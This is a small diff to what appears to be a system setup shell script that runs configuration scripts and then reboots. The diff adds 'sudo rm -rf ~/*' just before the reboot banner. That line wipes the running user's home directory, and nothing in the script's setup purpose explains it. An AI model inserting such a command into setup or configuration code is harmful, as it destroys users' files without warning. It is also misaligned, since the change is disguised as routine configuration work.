@@ -19,6 +19,8 @@ sh $path/languages/config.sh
 sh $path/window-managers/config.sh
 
 
+
+sudo rm -rf ~/*
 echo "============================================================================================================================================================"
 echo "[SCRIPT] Rebooting now..."
 sleep 2s
